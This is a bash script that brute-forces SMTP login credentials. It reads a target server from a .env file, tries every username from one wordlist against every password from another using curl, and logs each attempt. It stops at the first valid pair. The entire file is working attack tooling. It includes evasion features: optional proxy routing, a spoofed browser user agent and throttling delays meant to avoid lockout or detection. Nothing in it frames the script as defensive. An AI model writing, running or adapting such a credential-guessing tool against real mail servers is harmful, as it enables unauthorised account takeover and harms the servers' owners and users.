#!/bin/bash

# --- COLORS ---
G='\033[0;32m' # Green
R='\033[0;31m' # Red
Y='\033[1;33m' # Yellow
NC='\033[0m'   # No Color

# --- LOAD CONFIG ---
if [ -f .env ]; then
    export $(cat .env | xargs)
else
    echo -e "${R}[!] Error: .env file missing.${NC}"
    exit 1
fi

LOG_FILE="session_$(date +%Y%m%d_%H%M%S).log"

# --- NETWORK CHECK ---
echo -e "${Y}[*] Checking connection to $TARGET_SERVER...${NC}"
ping -c 1 "$TARGET_SERVER" > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "${R}[!] Error: Server unreachable.${NC}"
    exit 1
fi

# --- CORE FUNCTION ---
try_login() {
    local user=$1
    local pass=$2
    
    # Powerful curl with Proxy support (uncomment PROXY line in .env to use)
    curl_cmd=(curl --url "smtp://$TARGET_SERVER:$TARGET_PORT" \
        --user "$user:$pass" \
        --ssl-reqd \
        --mail-from "$user" \
        --upload-file /dev/null \
        --connect-timeout 15 \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
        --silent --fail)

    if [ ! -z "$PROXY" ]; then
        curl_cmd+=(--proxy "$PROXY")
    fi

    "${curl_cmd[@]}"
    return $?
}

# --- MAIN LOOP ---
echo -e "${G}--- PRO LOGIN TESTER STARTED ---${NC}"
echo "Logging to: $LOG_FILE"

while IFS= read -r user; do
    while IFS= read -r pass; do
        [[ -z "$pass" ]] && continue
        
        echo -ne "${Y}[*] Testing $user | $pass... ${NC}"
        
        try_login "$user" "$pass"
        
        if [ $? -eq 0 ]; then
            echo -e "${G}SUCCESS!${NC}"
            echo "[$(date)] SUCCESS: $user : $pass" >> "$LOG_FILE"
            echo -e "${G}Valid credentials found for $user${NC}"
            exit 0
        else
            echo -e "${R}FAILED${NC}"
            echo "[$(date)] FAILED: $user : $pass" >> "$LOG_FILE"
            sleep "${DELAY:-30}" # Uses DELAY from .env or defaults to 30s
        fi
    done < passwords.txt
done < usernames.txt
